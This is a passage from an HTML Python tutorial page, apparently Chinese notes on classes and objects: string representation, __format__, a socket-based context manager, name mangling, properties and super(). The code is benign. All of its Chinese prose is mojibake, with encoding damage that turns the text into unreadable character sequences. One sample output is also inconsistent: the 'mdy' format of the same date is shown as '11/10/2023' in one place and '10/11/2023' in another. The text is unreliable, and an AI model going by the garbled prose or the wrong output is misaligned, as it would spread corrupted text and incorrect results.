å¦‚æœä½ æ’å…¥æˆ–å¢åŠ æ–°çš„å…ƒç´ ï¼Œä½ åŒæ ·ä½¿ç”¨çˆ¶èŠ‚ç‚¹å…ƒç´ çš„<code>insert()</code>å’Œ<code>append()</code>æ–¹æ³•ã€‚ è¿˜èƒ½å¯¹å…ƒç´ ä½¿ç”¨ç´¢å¼•å’Œåˆ‡ç‰‡æ“ä½œï¼Œæ¯”å¦‚<code>element[i]</code>æˆ–<code>element[i:j]</code></p><h3 id="ç±»ä¸å¯¹è±¡"><a href="#ç±»ä¸å¯¹è±¡" class="headerlink" title="ç±»ä¸å¯¹è±¡"></a>ç±»ä¸å¯¹è±¡</h3><h4 id="æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²æ˜¾ç¤º"><a href="#æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²æ˜¾ç¤º" class="headerlink" title="æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²æ˜¾ç¤º"></a>æ”¹å˜å¯¹è±¡çš„å­—ç¬¦ä¸²æ˜¾ç¤º</h4><p>è¦æ”¹å˜ä¸€ä¸ªå®ä¾‹çš„å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œå¯ä»¥é‡æ–°å®šä¹‰å®ƒçš„<code>__str__()</code>å’Œ<code>__repr__()</code>æ–¹æ³•ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pair</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Pair(&#123;0.x!r&#125;, &#123;0.y!r&#125;)'</span>.format(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'(&#123;0.x!s&#125;, &#123;0.y!s&#125;)'</span>.format(self)</span><br></pre></td></tr></table></figure><p><code>__repr__()</code>æ–¹æ³•è¿”å›ä¸€ä¸ªå®ä¾‹çš„ä»£ç è¡¨ç¤ºå½¢å¼ï¼Œé€šå¸¸ç”¨æ¥é‡æ–°æ„é€ è¿™ä¸ªå®ä¾‹ã€‚ å†…ç½®çš„<code>repr()</code>å‡½æ•°è¿”å›è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œè·Ÿæˆ‘ä»¬ä½¿ç”¨äº¤äº’å¼è§£é‡Šå™¨æ˜¾ç¤ºçš„å€¼æ˜¯ä¸€æ ·çš„ã€‚<code>__str__()</code>æ–¹æ³•å°†å®ä¾‹è½¬æ¢ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä½¿ç”¨<code>str()</code>æˆ–<code>print()</code>å‡½æ•°ä¼šè¾“å‡ºè¿™ä¸ªå­—ç¬¦ä¸²ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = Pair(<span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p</span><br><span class="line">Pair(<span class="number">3</span>, <span class="number">4</span>) <span class="comment"># __repr__() output</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(p)</span><br><span class="line">(<span class="number">3</span>, <span class="number">4</span>) <span class="comment"># __str__() output</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„<code>format()</code>æ–¹æ³•çš„ä½¿ç”¨çœ‹ä¸Šå»å¾ˆæœ‰è¶£ï¼Œæ ¼å¼åŒ–ä»£ç <code>{0.x}</code>å¯¹åº”çš„æ˜¯ç¬¬<code>1</code>ä¸ªå‚æ•°çš„<code>x</code>å±æ€§ã€‚ å› æ­¤ï¼Œåœ¨ä¸‹é¢çš„å‡½æ•°ä¸­ï¼Œ<code>0</code>å®é™…ä¸ŠæŒ‡çš„å°±æ˜¯<code>self</code>æœ¬èº«ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Pair(&#123;0.x!r&#125;, &#123;0.y!r&#125;)'</span>.format(self)</span><br></pre></td></tr></table></figure><p>ä½œä¸ºè¿™ç§å®ç°çš„æ›¿ä»£ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>%</code>æ“ä½œç¬¦ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Pair(%r, %r)'</span> % (self.x, self.y)</span><br></pre></td></tr></table></figure><h4 id="è‡ªå®šä¹‰å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–"><a href="#è‡ªå®šä¹‰å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–" class="headerlink" title="è‡ªå®šä¹‰å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–"></a>è‡ªå®šä¹‰å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–</h4><p>ä¸ºäº†è‡ªå®šä¹‰å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ç±»ä¸Šé¢å®šä¹‰<code>__format__()</code>æ–¹æ³•ï¼Œå®ä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">_formats = &#123;</span><br><span class="line">    <span class="string">'ymd'</span> : <span class="string">'&#123;d.year&#125;-&#123;d.month&#125;-&#123;d.day&#125;'</span>,</span><br><span class="line">    <span class="string">'mdy'</span> : <span class="string">'&#123;d.month&#125;/&#123;d.day&#125;/&#123;d.year&#125;'</span>,</span><br><span class="line">    <span class="string">'dmy'</span> : <span class="string">'&#123;d.day&#125;/&#123;d.month&#125;/&#123;d.year&#125;'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, year, month, day)</span>:</span></span><br><span class="line">        self.year = year</span><br><span class="line">        self.month = month</span><br><span class="line">        self.day = day</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__format__</span><span class="params">(self, code)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">''</span>:</span><br><span class="line">            code = <span class="string">'ymd'</span></span><br><span class="line">        fmt = _formats[code]</span><br><span class="line">        <span class="keyword">return</span> fmt.format(d=self)</span><br></pre></td></tr></table></figure><p>ç°åœ¨<code>Date</code>ç±»çš„ç¤ºä¾‹å¯ä»¥æ”¯æŒæ ¼å¼åŒ–æ“ä½œï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = Date(<span class="number">2023</span>, <span class="number">10</span>, <span class="number">11</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d)</span><br><span class="line"><span class="string">'2023-10-11'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d, <span class="string">'mdy'</span>)</span><br><span class="line"><span class="string">'11/10/2023'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'The date is &#123;:ymd&#125;'</span>.format(d)</span><br><span class="line"><span class="string">'The date is 2023-10-11'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'The date is &#123;:mdy&#125;'</span>.format(d)</span><br><span class="line"><span class="string">'The date is 10/11/2023'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><code>__format__()</code>æ–¹æ³•ç»™<code>Python</code>çš„å­—ç¬¦ä¸²æ ¼å¼åŒ–åŠŸèƒ½æä¾›äº†ä¸€ä¸ªé’©å­ã€‚ è¿™é‡Œéœ€è¦ç€é‡å¼ºè°ƒçš„æ˜¯æ ¼å¼åŒ–ä»£ç çš„è§£æå·¥ä½œå®Œå…¨ç”±ç±»è‡ªå·±å†³å®šã€‚å› æ­¤ï¼Œæ ¼å¼åŒ–ä»£ç å¯ä»¥æ˜¯ä»»ä½•å€¼ã€‚ ä¾‹å¦‚ï¼Œå‚è€ƒä¸‹é¢æ¥è‡ª<code>datetime</code>æ¨¡å—ä¸­çš„ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> datetime <span class="keyword">import</span> date</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = date(<span class="number">2023</span>,<span class="number">10</span>,<span class="number">11</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d)</span><br><span class="line"><span class="string">'2023-10-11'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>format(d,<span class="string">'%A,%B,%d,%Y'</span>)</span><br><span class="line"><span class="string">'Wednesday,October,11,2023'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="è®©å¯¹è±¡æ”¯æŒä¸Šä¸‹æ–‡ç®¡ç†åè®®"><a href="#è®©å¯¹è±¡æ”¯æŒä¸Šä¸‹æ–‡ç®¡ç†åè®®" class="headerlink" title="è®©å¯¹è±¡æ”¯æŒä¸Šä¸‹æ–‡ç®¡ç†åè®®"></a>è®©å¯¹è±¡æ”¯æŒä¸Šä¸‹æ–‡ç®¡ç†åè®®</h4><p>ä¸ºäº†è®©ä¸€ä¸ªå¯¹è±¡å…¼å®¹<code>with</code>è¯­å¥ï¼Œä½ éœ€è¦å®ç°<code>__enter__()</code>å’Œ<code>__exit__()</code>æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œè€ƒè™‘å¦‚ä¸‹çš„ä¸€ä¸ªç±»ï¼Œå®ƒèƒ½ä¸ºæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç½‘ç»œè¿æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> socket, AF_INET, SOCK_STREAM</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LazyConnection</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, address, family=AF_INET, type=SOCK_STREAM)</span>:</span></span><br><span class="line">        self.address = address</span><br><span class="line">        self.family = family</span><br><span class="line">        self.type = type</span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.sock <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">'Already connected'</span>)</span><br><span class="line">        self.sock = socket(self.family, self.type)</span><br><span class="line">        self.sock.connect(self.address)</span><br><span class="line">        <span class="keyword">return</span> self.sock</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_ty, exc_val, tb)</span>:</span></span><br><span class="line">        self.sock.close()</span><br><span class="line">        self.sock = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç±»çš„å…³é”®ç‰¹ç‚¹åœ¨äºå®ƒè¡¨ç¤ºäº†ä¸€ä¸ªç½‘ç»œè¿æ¥ï¼Œä½†æ˜¯åˆå§‹åŒ–çš„æ—¶å€™å¹¶ä¸ä¼šåšä»»ä½•äº‹æƒ…ã€‚ è¿æ¥çš„å»ºç«‹å’Œå…³é—­æ˜¯ä½¿ç”¨<code>with</code>è¯­å¥è‡ªåŠ¨å®Œæˆçš„ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> partial</span><br><span class="line"></span><br><span class="line">conn = LazyConnection((<span class="string">'www.python.org'</span>, <span class="number">80</span>))</span><br><span class="line"><span class="comment"># Connection closed</span></span><br><span class="line"><span class="keyword">with</span> conn <span class="keyword">as</span> s:</span><br><span class="line">    <span class="comment"># conn.__enter__() executes: connection open</span></span><br><span class="line">    s.send(<span class="string">b'GET /index.html HTTP/1.0\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">b'Host: www.python.org\r\n'</span>)</span><br><span class="line">    s.send(<span class="string">b'\r\n'</span>)</span><br><span class="line">    resp = <span class="string">b''</span>.join(iter(partial(s.recv, <span class="number">8192</span>), <span class="string">b''</span>))</span><br><span class="line">    <span class="comment"># conn.__exit__() executes: connection closed</span></span><br></pre></td></tr></table></figure><p>ç¼–å†™ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„ä¸»è¦åŸç†æ˜¯ä½ çš„ä»£ç ä¼šæ”¾åˆ°<code>with</code>è¯­å¥å—ä¸­æ‰§è¡Œã€‚ å½“å‡ºç°<code>with</code>è¯­å¥çš„æ—¶å€™ï¼Œå¯¹è±¡çš„<code>__enter__()</code>æ–¹æ³•è¢«è§¦å‘ï¼Œ å®ƒè¿”å›çš„å€¼ä¼šè¢«èµ‹å€¼ç»™<code>as</code>å£°æ˜çš„å˜é‡ã€‚ç„¶åï¼Œ<code>with</code>è¯­å¥å—é‡Œé¢çš„ä»£ç å¼€å§‹æ‰§è¡Œã€‚ æœ€åï¼Œ<code>__exit__()</code>æ–¹æ³•è¢«è§¦å‘è¿›è¡Œæ¸…ç†å·¥ä½œã€‚</p><h4 id="åœ¨ç±»ä¸­å°è£…å±æ€§å"><a href="#åœ¨ç±»ä¸­å°è£…å±æ€§å" class="headerlink" title="åœ¨ç±»ä¸­å°è£…å±æ€§å"></a>åœ¨ç±»ä¸­å°è£…å±æ€§å</h4><p><code>Python</code>ç¨‹åºå‘˜ä¸å»ä¾èµ–è¯­è¨€ç‰¹æ€§å»å°è£…æ•°æ®ï¼Œè€Œæ˜¯é€šè¿‡éµå¾ªä¸€å®šçš„å±æ€§å’Œæ–¹æ³•å‘½åè§„çº¦æ¥è¾¾åˆ°è¿™ä¸ªæ•ˆæœã€‚ ç¬¬ä¸€ä¸ªçº¦å®šæ˜¯ä»»ä½•ä»¥å•ä¸‹åˆ’çº¿<code>_</code>å¼€å¤´çš„åå­—éƒ½åº”è¯¥æ˜¯å†…éƒ¨å®ç°ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._internal = <span class="number">0</span> <span class="comment"># å†…éƒ¨å±æ€§</span></span><br><span class="line">        self.public = <span class="number">1</span> <span class="comment"># A å…¬å…±å±æ€§</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">public_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        A public method</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_internal_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¿˜å¯èƒ½ä¼šé‡åˆ°åœ¨ç±»å®šä¹‰ä¸­ä½¿ç”¨ä¸¤ä¸ªä¸‹åˆ’çº¿<code>(__)</code>å¼€å¤´çš„å‘½åã€‚æ¯”å¦‚:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.__private = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__private_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">public_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        self.__private_method()</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨åŒä¸‹åˆ’çº¿å¼€å§‹ä¼šå¯¼è‡´è®¿é—®åç§°å˜æˆå…¶ä»–å½¢å¼ã€‚ æ¯”å¦‚ï¼Œåœ¨å‰é¢çš„ç±»<code>B</code>ä¸­ï¼Œç§æœ‰å±æ€§ä¼šè¢«åˆ†åˆ«é‡å‘½åä¸º<code>_B__private</code>å’Œ<code>_B__private_method</code>ã€‚ è¿™æ—¶å€™ä½ å¯èƒ½ä¼šé—®è¿™æ ·é‡å‘½åçš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Œç­”æ¡ˆå°±æ˜¯ç»§æ‰¿â€”â€”è¿™ç§å±æ€§é€šè¿‡ç»§æ‰¿æ˜¯æ— æ³•è¢«è¦†ç›–çš„ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span><span class="params">(B)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.__private = <span class="number">1</span> <span class="comment"># Does not override B.__private</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Does not override B.__private_method()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__private_method</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œç§æœ‰åç§°<code>__private</code>å’Œ<code>__private_method</code>è¢«é‡å‘½åä¸º<code>_C__private</code>å’Œ<code>_C__private_method</code>ï¼Œè¿™ä¸ªè·Ÿçˆ¶ç±»<code>B</code>ä¸­çš„åç§°æ˜¯å®Œå…¨ä¸åŒçš„ã€‚<br>å¤§å¤šæ•°è€Œè¨€ï¼Œä½ åº”è¯¥è®©ä½ çš„éå…¬å…±åç§°ä»¥å•ä¸‹åˆ’çº¿å¼€å¤´ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ æ¸…æ¥šä½ çš„ä»£ç ä¼šæ¶‰åŠåˆ°å­ç±»ï¼Œ å¹¶ä¸”æœ‰äº›å†…éƒ¨å±æ€§åº”è¯¥åœ¨å­ç±»ä¸­éšè—èµ·æ¥ï¼Œé‚£ä¹ˆæ‰è€ƒè™‘ä½¿ç”¨åŒä¸‹åˆ’çº¿æ–¹æ¡ˆã€‚</p><h4 id="åˆ›å»ºå¯ç®¡ç†çš„å±æ€§"><a href="#åˆ›å»ºå¯ç®¡ç†çš„å±æ€§" class="headerlink" title="åˆ›å»ºå¯ç®¡ç†çš„å±æ€§"></a>åˆ›å»ºå¯ç®¡ç†çš„å±æ€§</h4><p>è‡ªå®šä¹‰æŸä¸ªå±æ€§çš„ä¸€ç§ç®€å•æ–¹æ³•æ˜¯å°†å®ƒå®šä¹‰ä¸ºä¸€ä¸ª<code>property</code>ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢çš„ä»£ç å®šä¹‰äº†ä¸€ä¸ª<code>property</code>ï¼Œå¢åŠ å¯¹ä¸€ä¸ªå±æ€§ç®€å•çš„ç±»å‹æ£€æŸ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, first_name)</span>:</span></span><br><span class="line">        self._first_name = first_name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Getter function</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._first_name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Setter function</span></span><br><span class="line"><span class="meta">    @first_name.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> isinstance(value, str):</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">        self._first_name = value</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Deleter function (optional)</span></span><br><span class="line"><span class="meta">    @first_name.deleter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">first_name</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> AttributeError(<span class="string">"Can't delete attribute"</span>)</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ä¸­æœ‰ä¸‰ä¸ªç›¸å…³è”çš„æ–¹æ³•ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•çš„åå­—éƒ½å¿…é¡»ä¸€æ ·ã€‚ ç¬¬ä¸€ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ª<code>getter</code>å‡½æ•°ï¼Œå®ƒä½¿å¾—<code>first_name</code>æˆä¸ºä¸€ä¸ªå±æ€§ã€‚ å…¶ä»–ä¸¤ä¸ªæ–¹æ³•ç»™<code>first_name</code>å±æ€§æ·»åŠ äº†<code>setter</code>å’Œ<code>deleter</code>å‡½æ•°ã€‚ éœ€è¦å¼ºè°ƒçš„æ˜¯åªæœ‰åœ¨<code>first_name</code>å±æ€§è¢«åˆ›å»ºåï¼Œ åé¢çš„ä¸¤ä¸ªè£…é¥°å™¨<code>@first_name.setter</code>å’Œ<code>@first_name.deleter</code>æ‰èƒ½è¢«å®šä¹‰ã€‚<code>property</code>çš„ä¸€ä¸ªå…³é”®ç‰¹å¾æ˜¯å®ƒçœ‹ä¸Šå»è·Ÿæ™®é€šçš„<code>attribute</code>æ²¡ä»€ä¹ˆä¸¤æ ·ï¼Œ ä½†æ˜¯è®¿é—®å®ƒçš„æ—¶å€™ä¼šè‡ªåŠ¨è§¦å‘<code>getter</code>ã€<code>setter</code>å’Œ<code>deleter</code>æ–¹æ³•ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Person(<span class="string">'Guido'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.first_name <span class="comment"># Calls the getter</span></span><br><span class="line"><span class="string">'Guido'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.first_name = <span class="number">42</span> <span class="comment"># Calls the setter</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"prop.py"</span>, line <span class="number">14</span>, <span class="keyword">in</span> first_name</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected a string'</span>)</span><br><span class="line">TypeError: Expected a string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> a.first_name</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: can`t delete attribute</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="è°ƒç”¨çˆ¶ç±»æ–¹æ³•"><a href="#è°ƒç”¨çˆ¶ç±»æ–¹æ³•" class="headerlink" title="è°ƒç”¨çˆ¶ç±»æ–¹æ³•"></a>è°ƒç”¨çˆ¶ç±»æ–¹æ³•</h4><p>ä¸ºäº†è°ƒç”¨çˆ¶ç±»(è¶…ç±»)çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨<code>super()</code>å‡½æ•°ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'A.spam'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'B.spam'</span>)</span><br><span class="line">        super().spam()</span><br></pre></td></tr></table></figure><p><code>super()</code>å‡½æ•°çš„ä¸€ä¸ªå¸¸è§ç”¨æ³•æ˜¯åœ¨<code>__init__()</code>æ–¹æ³•ä¸­ç¡®ä¿çˆ¶ç±»è¢«æ­£ç¡®çš„åˆå§‹åŒ–äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 